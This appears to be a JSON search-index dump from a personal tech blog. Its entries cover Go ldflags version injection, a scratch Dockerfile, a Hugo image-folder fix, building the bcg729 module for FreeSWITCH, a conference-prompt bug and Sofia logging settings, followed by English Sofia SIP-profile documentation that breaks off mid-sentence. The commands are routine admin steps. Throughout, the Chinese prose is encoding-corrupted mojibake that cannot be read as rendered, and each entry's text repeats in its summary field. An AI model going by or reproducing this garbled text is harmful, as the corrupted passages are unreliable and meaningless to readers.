è·Ÿç€å™ªéŸ³çº§åˆ«çš„åç»­å­—èŠ‚éƒ½æ˜¯å£°éŸ³çš„é¢‘è°±ä¿¡æ¯ã€‚\nByte 1 2 3 ... M+1 +-----+-----+-----+-----+-----+ |level| N1 | N2 | .","title":"WebRTC äººå£°æ£€æµ‹ä¸èˆ’é€‚å™ªéŸ³"},{"content":"æš´éœ²çš„å˜é‡å¿…é¡»ç”¨varå®šä¹‰ï¼Œä¸èƒ½ç”¨constå®šä¹‰\n// main.go var VERSION = \u0026#34;unknow\u0026#34; var SHA = \u0026#34;unknow\u0026#34; var BUILD_TIME = \u0026#34;unknow\u0026#34; ... func main () { app := \u0026amp;cli.App{ Version: VERSION + \u0026#34;\\r\\nsha: \u0026#34; + SHA + \u0026#34;\\r\\nbuild time: \u0026#34; + BUILD_TIME, ... } Makefile\ntag?=v0.0.5 DATE?=$(shell date +%FT%T%z) VERSION_HASH = $(shell git rev-parse HEAD) LDFLAGS=\u0026#39;-X \u0026#34;main.VERSION=$(tag)\u0026#34; -X \u0026#34;main.SHA=$(VERSION_HASH)\u0026#34; -X \u0026#34;main.BUILD_TIME=$(DATE)\u0026#34;\u0026#39; build: CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build -ldflags $(LDFLAGS) -o wellcli main.go æ‰§è¡Œmake build, äº§ç”Ÿçš„äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œå°±å«æœ‰æ³¨å…¥çš„ä¿¡æ¯äº†ã€‚\n-ldflags \u0026#39;[pattern=]arg list\u0026#39; arguments to pass on each go tool link invocation. https://golang.google.cn/cmd/go/#hdr-Build_modes https://www.digitalocean.com/community/tutorials/using-ldflags-to-set-version-information-for-go-applications ","permalink":"https://wdd.js.org/golang/inject-version/","summary":"æš´éœ²çš„å˜é‡å¿…é¡»ç”¨varå®šä¹‰ï¼Œä¸èƒ½ç”¨constå®šä¹‰\n// main.go var VERSION = \u0026#34;unknow\u0026#34; var SHA = \u0026#34;unknow\u0026#34; var BUILD_TIME = \u0026#34;unknow\u0026#34; ... func main () { app := \u0026amp;cli.App{ Version: VERSION + \u0026#34;\\r\\nsha: \u0026#34; + SHA + \u0026#34;\\r\\nbuild time: \u0026#34; + BUILD_TIME, ... } Makefile\ntag?=v0.0.5 DATE?=$(shell date +%FT%T%z) VERSION_HASH = $(shell git rev-parse HEAD) LDFLAGS=\u0026#39;-X \u0026#34;main.VERSION=$(tag)\u0026#34; -X \u0026#34;main.SHA=$(VERSION_HASH)\u0026#34; -X \u0026#34;main.BUILD_TIME=$(DATE)\u0026#34;\u0026#39; build: CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build -ldflags $(LDFLAGS) -o wellcli main.go æ‰§è¡Œmake build, äº§ç”Ÿçš„äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œå°±å«æœ‰æ³¨å…¥çš„ä¿¡æ¯äº†ã€‚\n-ldflags \u0026#39;[pattern=]arg list\u0026#39; arguments to pass on each go tool link invocation.","title":"åœ¨äºŒè¿›åˆ¶æ–‡ä»¶ä¸­æ³¨å…¥ç‰ˆæœ¬ä¿¡æ¯"},{"content":"FROM golang:1.16.2 as builder ENV GO111MODULE=on GOPROXY=https://goproxy.cn,direct WORKDIR /app COPY . . RUN CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build . FROM scratch WORKDIR /app COPY --from=builder /app/your_app . # é…ç½®æ—¶åŒº COPY --from=builder /usr/share/zoneinfo /usr/share/zoneinfo ENV TZ=Asia/Shanghai EXPOSE 8080 ENTRYPOINT [\u0026#34;./your_app\u0026#34;] ","permalink":"https://wdd.js.org/golang/scratch-dockerfile/","summary":"FROM golang:1.16.2 as builder ENV GO111MODULE=on GOPROXY=https://goproxy.cn,direct WORKDIR /app COPY . . RUN CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build . FROM scratch WORKDIR /app COPY --from=builder /app/your_app . # é…ç½®æ—¶åŒº COPY --from=builder /usr/share/zoneinfo /usr/share/zoneinfo ENV TZ=Asia/Shanghai EXPOSE 8080 ENTRYPOINT [\u0026#34;./your_app\u0026#34;] ","title":"Golang Dockerfile"},{"content":"å¦‚ä½•åœ¨markdownä¸­æ’å…¥å›¾ç‰‡ åœ¨static ç›®å½•ä¸­åˆ›å»º images ç›®å½•ï¼Œç„¶åæŠŠå›¾ç‰‡æ”¾åˆ°imagesç›®å½•ä¸­ã€‚\nåœ¨æ–‡ç« ä¸­å¼•ç”¨çš„æ—¶å€™\n![](/images/qianxun.jpeg#center) Warning æˆ‘ä¹‹å‰åˆ›å»ºçš„æ–‡ä»¶å¤¹çš„åå­—å«åš img, æœ¬åœ°å¯ä»¥æ­£å¸¸æ˜¾ç¤ºï¼Œä½†æ˜¯éƒ¨ç½²ä¹‹åï¼Œå°±æ— æ³•æ˜¾ç¤ºå›¾ç‰‡äº†ã€‚\næœ€åæˆ‘æŠŠimgæ”¹æˆimagesæ‰èƒ½æ­£å¸¸åœ¨ç½‘é¡µä¸Šæ˜¾ç¤ºã€‚\n","permalink":"https://wdd.js.org/posts/2022/05/hugo-blog-faq/","summary":"å¦‚ä½•åœ¨markdownä¸­æ’å…¥å›¾ç‰‡ åœ¨static ç›®å½•ä¸­åˆ›å»º images ç›®å½•ï¼Œç„¶åæŠŠå›¾ç‰‡æ”¾åˆ°imagesç›®å½•ä¸­ã€‚\nåœ¨æ–‡ç« ä¸­å¼•ç”¨çš„æ—¶å€™\n![](/images/qianxun.jpeg#center) Warning æˆ‘ä¹‹å‰åˆ›å»ºçš„æ–‡ä»¶å¤¹çš„åå­—å«åš img, æœ¬åœ°å¯ä»¥æ­£å¸¸æ˜¾ç¤ºï¼Œä½†æ˜¯éƒ¨ç½²ä¹‹åï¼Œå°±æ— æ³•æ˜¾ç¤ºå›¾ç‰‡äº†ã€‚\næœ€åæˆ‘æŠŠimgæ”¹æˆimagesæ‰èƒ½æ­£å¸¸åœ¨ç½‘é¡µä¸Šæ˜¾ç¤ºã€‚","title":"Hugoåšå®¢å¸¸è§é—®é¢˜ä»¥åŠè§£å†³æ–¹æ¡ˆ"},{"content":"g729ç¼–ç çš„å ç”¨å¸¦å®½æ˜¯g711çš„1/8ï¼Œä½¿ç”¨g729ç¼–ç ï¼Œå¯ä»¥æå¤§çš„é™ä½å¸¦å®½çš„è´¹ç”¨ã€‚fsåŸç”Ÿçš„mod_g927æ¨¡å—æ˜¯éœ€è¦æŒ‰å¹¶å‘æ•°æ”¶è´¹çš„ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥ä½¿ç”¨å¼€æºçš„bcg729æ¨¡å—ã€‚\nè¿™é‡Œéœ€è¦å‡†å¤‡ä¸¤ä¸ªä»“åº“ï¼Œä¸ºäº†åŠ å¿«cloneé€Ÿåº¦ï¼Œæˆ‘å°†è¿™ä¸¤ä¸ªæ¨¡å—å¯¼å…¥åˆ°giteeä¸Šã€‚\nhttps://gitee.com/wangduanduan/mod_bcg729 https://gitee.com/wangduanduan/bcg729 å®‰è£…å‰æ å·²ç»å®‰è£…å¥½äº†freeswitch, ç¼–è¯‘mod_bcg729æ¨¡å—ï¼Œéœ€è¦æŒ‡å®šfreeswitchå¤´æ–‡ä»¶çš„ä½ç½®\nstep0: åˆ‡æ¢åˆ°å·¥ä½œç›®å½• cd /usr/local/src/ step1: clone mod_bcg729 git clone https://gitee.com/wangduanduan/mod_bcg729.git step2: clone bcg729 mod_bcg729æ¨¡å—åœ¨ç¼–è¾‘çš„æ—¶å€™ï¼Œä¼šæ£€æŸ¥å½“å‰ç›®å½•ä¸‹æœ‰æ²¡æœ‰bcg729çš„ç›®å½•ã€‚ å¦‚æœæ²¡æœ‰è¿™ä¸ªç›®å½•ï¼Œå°±ä¼šä»githubä¸Šclone bcg729çš„é¡¹ç›®ã€‚ æ‰€ä»¥æˆ‘ä»¬å¯ä»¥åœ¨ç¼–è¯‘ä¹‹å‰ï¼Œå…ˆæŠŠbcg729 cloneåˆ°mob_bcg729ç›®å½•ä¸‹\ncd mod_bcg729 git clone https://gitee.com/wangduanduan/bcg729.git step3: ç¼–è¾‘mod_bcg729 ç¼–è¯‘mod_bcg729éœ€è¦æŒ‡å®šfså¤´æ–‡ä»¶switch.hçš„ä½ç½®ã€‚ åœ¨Makefileé¡¹ç›®é‡Œæœ‰FS_INCLUDESè¿™ä¸ªå˜é‡ç”¨æ¥å®šä¹‰fså¤´æ–‡ä»¶çš„ä½ç½®\nFS_INCLUDES=/usr/include/freeswitch FS_MODULES=/usr/lib/freeswitch/mod å¦‚æœä½ çš„æºç å¤´æ–‡ä»¶è·¯å¾„ä¸æ˜¯/usr/include/freeswitchï¼Œ åˆ™éœ€è¦åœ¨æ‰§è¡Œmakeå‘½ä»¤æ—¶é€šè¿‡å‚æ•°æŒ‡å®šï¼Œ ä¾‹å¦‚ä¸‹é¢ç¼–è¯‘çš„æ—¶å€™ã€‚\nmake FS_INCLUDES=/usr/local/freeswitch/include/freeswitch Tip å¦‚ä½•æ‰¾åˆ°å¤´æ–‡ä»¶çš„ç›®å½•ï¼Ÿ å¤´æ–‡ä»¶ä¸€èˆ¬åœ¨fså®‰è£…ç›®å½•çš„include/freeswitchç›®å½•ä¸‹ å¦‚æœè¿˜æ˜¯æ‰¾ä¸åˆ°ï¼Œåˆ™å¯ä»¥ä½¿ç”¨ find /usr -name switch.h -type f æœç´¢å¯¹åº”çš„å¤´æ–‡ä»¶ step4: å¤åˆ¶soæ–‡ä»¶ mod_bcg729ç¼–è¯‘ä¹‹åï¼Œå¯ä»¥æŠŠç”Ÿæˆçš„mod_bcg729.soæ‹·è´åˆ°fså®‰è£…ç›®å½•çš„modç›®å½•ä¸‹\nstep5: åŠ è½½æ¨¡å— å‘½ä»¤è¡ŒåŠ è½½\nload mod_bcg729 é…ç½®æ–‡ä»¶åŠ è½½ å‘½ä»¤è¡ŒåŠ è½½é‡å¯åå°±å¤±æ•ˆäº†ï¼Œå¯ä»¥å°†åŠ è½½çš„æ¨¡å—å†™å…¥åˆ°é…ç½®æ–‡ä»¶ä¸­ã€‚ åœ¨modules.conf.xmlä¸­åŠ å…¥\n\u0026lt;load module=\u0026#34;mod_bcg729\u0026#34;/\u0026gt; step5: vars.xmlä¿®æ”¹ \u0026lt;X-PRE-PROCESS cmd=\u0026#34;set\u0026#34; data=\u0026#34;global_codec_prefs=PCMU,PCMA,G729\u0026#34; /\u0026gt; \u0026lt;X-PRE-PROCESS cmd=\u0026#34;set\u0026#34; data=\u0026#34;outbound_codec_prefs=PCMU,PCMA,G729\u0026#34;/\u0026gt; \u0026lt;X-PRE-PROCESScmd=\u0026#34;set\u0026#34;data=\u0026#34;media_mix_inbound_outbound_codecs=true\u0026#34;/\u0026gt; step6: sip profileä¿®æ”¹ å¼€å¯è½¬ç \n\u0026lt;param name=\u0026#34;disable-transcoding\u0026#34; value=\u0026#34;false\u0026#34;/\u0026gt; ç„¶åé‡å¯fs, è¿›å…¥åˆ°fs_cliä¸­ï¼Œè¾“å…¥: show codec, çœ‹çœ‹æœ‰æ²¡æœ‰æ˜¾ç¤º729ç¼–ç ã€‚ç„¶åå°±æ˜¯æ‰¾è¯æœºï¼Œæµ‹è¯•g729ç¼–ç äº†ã€‚\n","permalink":"https://wdd.js.org/freeswitch/install-bcg729/","summary":"g729ç¼–ç çš„å ç”¨å¸¦å®½æ˜¯g711çš„1/8ï¼Œä½¿ç”¨g729ç¼–ç ï¼Œå¯ä»¥æå¤§çš„é™ä½å¸¦å®½çš„è´¹ç”¨ã€‚fsåŸç”Ÿçš„mod_g927æ¨¡å—æ˜¯éœ€è¦æŒ‰å¹¶å‘æ•°æ”¶è´¹çš„ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥ä½¿ç”¨å¼€æºçš„bcg729æ¨¡å—ã€‚\nè¿™é‡Œéœ€è¦å‡†å¤‡ä¸¤ä¸ªä»“åº“ï¼Œä¸ºäº†åŠ å¿«cloneé€Ÿåº¦ï¼Œæˆ‘å°†è¿™ä¸¤ä¸ªæ¨¡å—å¯¼å…¥åˆ°giteeä¸Šã€‚\nhttps://gitee.com/wangduanduan/mod_bcg729 https://gitee.com/wangduanduan/bcg729 å®‰è£…å‰æ å·²ç»å®‰è£…å¥½äº†freeswitch, ç¼–è¯‘mod_bcg729æ¨¡å—ï¼Œéœ€è¦æŒ‡å®šfreeswitchå¤´æ–‡ä»¶çš„ä½ç½®\nstep0: åˆ‡æ¢åˆ°å·¥ä½œç›®å½• cd /usr/local/src/ step1: clone mod_bcg729 git clone https://gitee.com/wangduanduan/mod_bcg729.git step2: clone bcg729 mod_bcg729æ¨¡å—åœ¨ç¼–è¾‘çš„æ—¶å€™ï¼Œä¼šæ£€æŸ¥å½“å‰ç›®å½•ä¸‹æœ‰æ²¡æœ‰bcg729çš„ç›®å½•ã€‚ å¦‚æœæ²¡æœ‰è¿™ä¸ªç›®å½•ï¼Œå°±ä¼šä»githubä¸Šclone bcg729çš„é¡¹ç›®ã€‚ æ‰€ä»¥æˆ‘ä»¬å¯ä»¥åœ¨ç¼–è¯‘ä¹‹å‰ï¼Œå…ˆæŠŠbcg729 cloneåˆ°mob_bcg729ç›®å½•ä¸‹\ncd mod_bcg729 git clone https://gitee.com/wangduanduan/bcg729.git step3: ç¼–è¾‘mod_bcg729 ç¼–è¯‘mod_bcg729éœ€è¦æŒ‡å®šfså¤´æ–‡ä»¶switch.hçš„ä½ç½®ã€‚ åœ¨Makefileé¡¹ç›®é‡Œæœ‰FS_INCLUDESè¿™ä¸ªå˜é‡ç”¨æ¥å®šä¹‰fså¤´æ–‡ä»¶çš„ä½ç½®\nFS_INCLUDES=/usr/include/freeswitch FS_MODULES=/usr/lib/freeswitch/mod å¦‚æœä½ çš„æºç å¤´æ–‡ä»¶è·¯å¾„ä¸æ˜¯/usr/include/freeswitchï¼Œ åˆ™éœ€è¦åœ¨æ‰§è¡Œmakeå‘½ä»¤æ—¶é€šè¿‡å‚æ•°æŒ‡å®šï¼Œ ä¾‹å¦‚ä¸‹é¢ç¼–è¯‘çš„æ—¶å€™ã€‚\nmake FS_INCLUDES=/usr/local/freeswitch/include/freeswitch Tip å¦‚ä½•æ‰¾åˆ°å¤´æ–‡ä»¶çš„ç›®å½•ï¼Ÿ å¤´æ–‡ä»¶ä¸€èˆ¬åœ¨fså®‰è£…ç›®å½•çš„include/freeswitchç›®å½•ä¸‹ å¦‚æœè¿˜æ˜¯æ‰¾ä¸åˆ°ï¼Œåˆ™å¯ä»¥ä½¿ç”¨ find /usr -name switch.h -type f æœç´¢å¯¹åº”çš„å¤´æ–‡ä»¶ step4: å¤åˆ¶soæ–‡ä»¶ mod_bcg729ç¼–è¯‘ä¹‹åï¼Œå¯ä»¥æŠŠç”Ÿæˆçš„mod_bcg729.soæ‹·è´åˆ°fså®‰è£…ç›®å½•çš„modç›®å½•ä¸‹\nstep5: åŠ è½½æ¨¡å— å‘½ä»¤è¡ŒåŠ è½½\nload mod_bcg729 é…ç½®æ–‡ä»¶åŠ è½½ å‘½ä»¤è¡ŒåŠ è½½é‡å¯åå°±å¤±æ•ˆäº†ï¼Œå¯ä»¥å°†åŠ è½½çš„æ¨¡å—å†™å…¥åˆ°é…ç½®æ–‡ä»¶ä¸­ã€‚ åœ¨modules.conf.xmlä¸­åŠ å…¥\n\u0026lt;load module=\u0026#34;mod_bcg729\u0026#34;/\u0026gt; step5: vars.xmlä¿®æ”¹ \u0026lt;X-PRE-PROCESS cmd=\u0026#34;set\u0026#34; data=\u0026#34;global_codec_prefs=PCMU,PCMA,G729\u0026#34; /\u0026gt; \u0026lt;X-PRE-PROCESS cmd=\u0026#34;set\u0026#34; data=\u0026#34;outbound_codec_prefs=PCMU,PCMA,G729\u0026#34;/\u0026gt; \u0026lt;X-PRE-PROCESScmd=\u0026#34;set\u0026#34;data=\u0026#34;media_mix_inbound_outbound_codecs=true\u0026#34;/\u0026gt; step6: sip profileä¿®æ”¹ å¼€å¯è½¬ç ","title":"å®‰è£…bcg729æ¨¡å—"},{"content":"å‘¼å…¥åˆ°ä¼šè®®ï¼Œæ­£å¸¸æ¥è¯´ï¼Œå½“ä¼šè®®å®¤æœ‰ä¸”åªæœ‰ä¸€äººæ—¶ï¼Œåº”è¯¥ä¼šæŠ¥â€œå½“å‰åªæœ‰ä¸€äººçš„æç¤ºéŸ³â€ã€‚ä½†æ˜¯æµ‹è¯•çš„æ—¶å€™ï¼Œè¾“å…¥äº†å¯†ç ï¼Œè¿›å…¥äº†ä¼šè®®ï¼Œå´æ²¡æœ‰æ’­æŠ¥æ­£å¸¸çš„æç¤ºéŸ³ã€‚\nç»è¿‡æ’æŸ¥å‘ç°ï¼Œdialplanä¸­ï¼Œä¼šè®®å®¤çš„åå­—ä¸­å«æœ‰@ç¬¦å·ã€‚\næŒ‰ç…§fsçš„æ–‡æ¡£ï¼Œå‘ç°@åé¢åº”è¯¥æ˜¯profilename, ç„¶è€Œfsçš„conference.conf.xmlå´æ²¡æœ‰è¿™ä¸ªprofile, è¿›è€Œå¯¼è‡´è¯­éŸ³æ— æ³•æ’­æŠ¥çš„é—®é¢˜ã€‚æ‰€ä»¥åªè¦åŠ å…¥è¿™ä¸ªprofile, æˆ–è€…ç›´æ¥ç”¨@default, å°±å¯ä»¥æ­£ç¡®çš„æ’­æŠ¥è¯­éŸ³äº†ã€‚\nAction data Description confname profile is \u0026ldquo;default\u0026rdquo;, no flags or pin confname+1234 profile is \u0026ldquo;default\u0026rdquo;, pin is 1234 confname@profilename+1234 profile is \u0026ldquo;profilename\u0026rdquo;, pin=1234, no flags confname+1234+flags{mute} profile is \u0026ldquo;default\u0026rdquo;, pin=1234, one flag confname++flags{endconf|moderator} profile is \u0026ldquo;default\u0026rdquo;, no p.i.n., multiple flags bridge:confname:1000@${domain_name} a \u0026ldquo;bridging\u0026rdquo; conference, you must provide another endpoint, or \u0026rsquo;none'. bridge:uuid:none a \u0026ldquo;bridging\u0026rdquo; conference with UUID assigned as conference name æ‰€ä»¥ï¼Œå½“ä½ é‡åˆ°é—®é¢˜çš„æ—¶å€™ï¼Œåº”è¯¥ä»”ç»†çš„å†å»é˜…è¯»ä¸€ä¸‹å®˜æ–¹çš„æ¥å£æ–‡æ¡£ã€‚\nå‚è€ƒæ–‡æ¡£\nhttps://txlab.wordpress.com/2012/09/17/setting-up-a-conference-bridge-with-freeswitch/ https://freeswitch.org/confluence/display/FREESWITCH/mod_conference ","permalink":"https://wdd.js.org/freeswitch/conference-announce/","summary":"å‘¼å…¥åˆ°ä¼šè®®ï¼Œæ­£å¸¸æ¥è¯´ï¼Œå½“ä¼šè®®å®¤æœ‰ä¸”åªæœ‰ä¸€äººæ—¶ï¼Œåº”è¯¥ä¼šæŠ¥â€œå½“å‰åªæœ‰ä¸€äººçš„æç¤ºéŸ³â€ã€‚ä½†æ˜¯æµ‹è¯•çš„æ—¶å€™ï¼Œè¾“å…¥äº†å¯†ç ï¼Œè¿›å…¥äº†ä¼šè®®ï¼Œå´æ²¡æœ‰æ’­æŠ¥æ­£å¸¸çš„æç¤ºéŸ³ã€‚\nç»è¿‡æ’æŸ¥å‘ç°ï¼Œdialplanä¸­ï¼Œä¼šè®®å®¤çš„åå­—ä¸­å«æœ‰@ç¬¦å·ã€‚\næŒ‰ç…§fsçš„æ–‡æ¡£ï¼Œå‘ç°@åé¢åº”è¯¥æ˜¯profilename, ç„¶è€Œfsçš„conference.conf.xmlå´æ²¡æœ‰è¿™ä¸ªprofile, è¿›è€Œå¯¼è‡´è¯­éŸ³æ— æ³•æ’­æŠ¥çš„é—®é¢˜ã€‚æ‰€ä»¥åªè¦åŠ å…¥è¿™ä¸ªprofile, æˆ–è€…ç›´æ¥ç”¨@default, å°±å¯ä»¥æ­£ç¡®çš„æ’­æŠ¥è¯­éŸ³äº†ã€‚\nAction data Description confname profile is \u0026ldquo;default\u0026rdquo;, no flags or pin confname+1234 profile is \u0026ldquo;default\u0026rdquo;, pin is 1234 confname@profilename+1234 profile is \u0026ldquo;profilename\u0026rdquo;, pin=1234, no flags confname+1234+flags{mute} profile is \u0026ldquo;default\u0026rdquo;, pin=1234, one flag confname++flags{endconf|moderator} profile is \u0026ldquo;default\u0026rdquo;, no p.i.n., multiple flags bridge:confname:1000@${domain_name} a \u0026ldquo;bridging\u0026rdquo; conference, you must provide another endpoint, or \u0026rsquo;none'. bridge:uuid:none a \u0026ldquo;bridging\u0026rdquo; conference with UUID assigned as conference name æ‰€ä»¥ï¼Œå½“ä½ é‡åˆ°é—®é¢˜çš„æ—¶å€™ï¼Œåº”è¯¥ä»”ç»†çš„å†å»é˜…è¯»ä¸€ä¸‹å®˜æ–¹çš„æ¥å£æ–‡æ¡£ã€‚\nå‚è€ƒæ–‡æ¡£","title":"ä¼šè®®æç¤ºéŸ³æ— æ³•æ­£å¸¸æ’­æ”¾"},{"content":"å¼€å¯sipä¿¡ä»¤çš„æ—¥å¿— è¿™æ ·ä¼šè®©fsæŠŠæ”¶å‘çš„sipä¿¡ä»¤æ‰“å°åˆ°fs_clié‡Œé¢ï¼Œä½†ä¸æ˜¯æ—¥å¿—æ–‡ä»¶é‡Œé¢\nsofia global siptrace on # sofia global siptrace off å…³é—­ å¼€å¯sofiaæ¨¡å—çš„æ—¥å¿— sofia æ¨¡å—çš„æ—¥å¿—å³ä½¿å¼€å¯ï¼Œä¹Ÿæ˜¯è¾“å‡ºåˆ°fs_clié‡Œé¢çš„ï¼Œä¸ä¼šè¾“å‡ºåˆ°æ—¥å¿—æ–‡ä»¶é‡Œé¢\nsofia loglevel all 7 # sofia loglevel \u0026lt;all|default|tport|iptsec|nea|nta|nth_client|nth_server|nua|soa|sresolv|stun\u0026gt; [0-9] å°†fs_cliçš„è¾“å‡ºï¼Œå†™åˆ°æ—¥å¿—æ–‡ä»¶é‡Œ sofia tracelevel ä¼šå°†æŸäº›æ—¥å¿—é‡å®šå‘åˆ°æ—¥å¿—æ–‡ä»¶é‡Œ sofia tracelevel debug # sofia tracelevel \u0026lt;console|alert|crit|err|warning|notice|info|debug\u0026gt; æ³¨æ„ï¼Œdebugçº§åˆ«çš„æ—¥å¿—éå¸¸å¤šï¼Œä»…ä»…é€‚ç”¨äºdebug\nå¤§é‡çš„æ—¥å¿—å†™å…¥ç£ç›˜\nå ç”¨å¤ªå¤šçš„io ç£ç›˜ç©ºé—´å¯èƒ½å¾ˆå¿«å æ»¡ ","permalink":"https://wdd.js.org/freeswitch/log-settings/","summary":"å¼€å¯sipä¿¡ä»¤çš„æ—¥å¿— è¿™æ ·ä¼šè®©fsæŠŠæ”¶å‘çš„sipä¿¡ä»¤æ‰“å°åˆ°fs_clié‡Œé¢ï¼Œä½†ä¸æ˜¯æ—¥å¿—æ–‡ä»¶é‡Œé¢\nsofia global siptrace on # sofia global siptrace off å…³é—­ å¼€å¯sofiaæ¨¡å—çš„æ—¥å¿— sofia æ¨¡å—çš„æ—¥å¿—å³ä½¿å¼€å¯ï¼Œä¹Ÿæ˜¯è¾“å‡ºåˆ°fs_clié‡Œé¢çš„ï¼Œä¸ä¼šè¾“å‡ºåˆ°æ—¥å¿—æ–‡ä»¶é‡Œé¢\nsofia loglevel all 7 # sofia loglevel \u0026lt;all|default|tport|iptsec|nea|nta|nth_client|nth_server|nua|soa|sresolv|stun\u0026gt; [0-9] å°†fs_cliçš„è¾“å‡ºï¼Œå†™åˆ°æ—¥å¿—æ–‡ä»¶é‡Œ sofia tracelevel ä¼šå°†æŸäº›æ—¥å¿—é‡å®šå‘åˆ°æ—¥å¿—æ–‡ä»¶é‡Œ sofia tracelevel debug # sofia tracelevel \u0026lt;console|alert|crit|err|warning|notice|info|debug\u0026gt; æ³¨æ„ï¼Œdebugçº§åˆ«çš„æ—¥å¿—éå¸¸å¤šï¼Œä»…ä»…é€‚ç”¨äºdebug\nå¤§é‡çš„æ—¥å¿—å†™å…¥ç£ç›˜\nå ç”¨å¤ªå¤šçš„io ç£ç›˜ç©ºé—´å¯èƒ½å¾ˆå¿«å æ»¡ ","title":"FSæ—¥å¿—è®¾ç½®"},{"content":"About Sofia is aÂ FreeSWITCHâ„¢ module (mod_sofia) that provides SIP connectivity to and from FreeSWITCH in the form of a User Agent. A \u0026ldquo;User Agent\u0026rdquo; (\u0026ldquo;UA\u0026rdquo;) is an application used for handling a certain network protocol; the network protocol in Sofia\u0026rsquo;s case is SIP. Sofia is the general name of any User Agent in FreeSWITCH using the SIP network protocol. For example, Sofia receives calls sent to FreeSWITCH from other SIP User Agents (UAs), sends calls to other UAs, acts as a client to register FreeSWITCH with other UAs, lets clients register with FreeSWITCH, and connects calls (i.e., to local extensions). To add a SIP Provider (Sofia User Agent) to your FreeSWITCH, please see the Interoperability Examples and add the SIP Provider information in an .xml file stored under conf/sip_profiles/\nClick here to expand Table of Contents\nSofia allows for multiple User Agents A \u0026ldquo;User Agent\u0026rdquo; (\u0026ldquo;UA\u0026rdquo;) is an application used for running a certain network protocol, and a Sofia UA is the same thing but the protocol in that case is SIP. When FreeSWITCH starts, it reads the conf/autoload_configs/sofia.conf.xml file. That file contains a \u0026ldquo;X-PRE-PROCESS\u0026rdquo; directive which instructs FreeSWITCH to subsequently load and merge any conf/sip_profiles/*.xml files. Each *.xml file so loaded and merged should contain a complete description of one or more SIP Profiles. Each SIP Profile so loaded is part of a \u0026ldquo;User Agent\u0026rdquo; or \u0026ldquo;UA\u0026rdquo;; in FreeSWITCH terms, UA = User Agent = Sofia Profile = SIP Profile. Note that the individual UAs so loaded are all merged together by FreeSWITCH and must not interfere with each other: In particular, each UA must have its own unique port on which it accepts connections (the default port for SIP is 5060).\nMultiple User Agents (Profiles) and the Dialplan Why might you want to create multiple User Agents? Here\u0026rsquo;s an example. In my office, I use a firewall. This means that calls I make to locations outside the firewall must use a STUN server to transverse the NAT in the firewall, while calls within the office don\u0026rsquo;t need to use a STUN server. In order to accommodate these requirements, I\u0026rsquo;ve created two different UAs. One of them uses a STUN server and for that matter also connects up to the PSTN through a service provider. The other UA is purely for local SIP calls. Now I\u0026rsquo;ve got two UAs defined by my profiles, each of which can handle a call. When dialing a SIP address or telephone number, which UA is used? That determination is made in the dialplan. One syntax for making a call via Sofia in the dialplan is sofia/profile_name/destination\nSo, the task becomes rather straightforward. Dialplans use pattern matching and other tricks to determine how to handle a call. My dialplan examines what I\u0026rsquo;ve dialed and then determines what profile to use with that call. If I dial a telephone number, the dialplan selects the UA that connects up to the PSTN. If I dial a SIP address outside the firewall, the dialplan selects that same UA because it uses the STUN server. But if I dial a SIP address that\u0026rsquo;s inside the firewall, the dialplan selects the \u0026ldquo;local\u0026rdquo; UA. To understand how to write dialplans, use pattern matching, etc., see Dialplan\nThe Relationship Between SIP Profiles and Domains The following content was written in a mailing list thread by Anthony Minessale in response to questions about how SIP profiles relate to domain names in FreeSWITCH. The best thing to do is take a look at these things from a step back. The domains inside the XML registry are completely different from the domains on the internet and again completely different from domains in sip packets. The profiles are again entirely different from any of the above. Its up to you to align them if you so choose. The default configuration distributed with FreeSWITCH sets up the scenario most likely to load on any machine and work out of the box. That is the primary goal of that configuration, so, It sets the domain in both the directory, the global default domain variable and the name of the internal profile to be identical to the IP addr on the box that can reach the internet. Then it sets the sip to force everything to that value. When you want to detach from this behavior, you are probably on a venture to do some kind of multi-home setup. Aliases in the tag are a list of keys you want to use to use that lead to the current profile your are configuring. Think of it as the /etc/hosts file in Unix, only for profiles. When you define aliases to match all of the possible domains hosted on a particular profile, then when you try to take a user@host.com notation and decide which profile it came from, you can use the aliases to find it providing you have added to that profile. The tag is an indicator telling the profile to open the XML registry in FreeSWITCH and run through any domains defined therein. The 2 key attributes are: alias: [true/false] (automatically create an alias for this domain as mentioned above) parse: [true/false] (scan the domain for gateway entries and include them into this profile) name: [] (either the name of a specific domain or \u0026lsquo;all\u0026rsquo; to denote parsing every domain in the directory)\nAs you showed in your question the default config has If you apply what you have learned above, it will scan for every domain (there is only one by default) and add an alias for it and not parse it for gateways. The default directory uses global config vars to set the domain to match the local IP addr on the box. So now you will have a domain in your config that is your IP addr, and the internal profile will attach to it and add an alias so that value expands to match it. This is explained in a comment at the top of directory/default.xml: FreeSWITCH works off the concept of users and domains just like email. You have users that are in domains for example 1000@domain.com.\nWhen freeswitch gets a register packet it looks for the user in the directory based on the from or to domain in the packet depending on how your sofia profile is configured. Out of the box the default domain will be the IP address of the machine running FreeSWITCH. This IP can be found by typing \u0026ldquo;sofia status\u0026rdquo; at the CLI. You will register your phones to the IP and not the hostname by default. If you wish to register using the domain please open vars.xml in the root conf directory and set the default domain to the hostname you desire. Then you would use the domain name in the client instead of the IP address to register with FreeSWITCH.\nSo having more than one profile with the default of is going to end up aliasing the same domains into all profiles who call it and cause an overwrite in the lookup table and probably an error in your logs somewhere. If you had parse=\u0026ldquo;true\u0026rdquo; on all of them, they would all try and register to the gateways in all of your domains. If you look at the stock config, external.xml is a good example of a secondary profile, it has so no aliases, and yes parse \u0026hellip; the exact opposite of the internal so that all the gateways would register from external and internal would bind to the local IP addr. So, you probably want to use separate per domain per profile you want to bind it to in more complicated setups.\nStructure of a Profile Each profile may contain several different subsections. At the present time there\u0026rsquo;s no XSD or DTD for sofia.conf.xml â€” and any volunteer who can create one would be very welcome indeed.\nGateway Each profile can have several gateways: elements\u0026hellip; elements\u0026hellip; A gateway has an attribute \u0026ldquo;name\u0026rdquo; by which it can be referred. A gateway describes how to use a different UA to reach destinations. For example, the gateway may provide access to the PSTN, or to a private SIP network. The reason for defining a gateway, presumably, is because the gateway requires certain information before it will accept a call from the FreeSWITCH User Agent. Variables can be defined on a gateway. Inbound variables are set on the channel of a call received from a gateway, outbound variables are set on the channel of a call sent to a gateway. An example gateway configuration would be: To reach a particular gateway from the dial plan, 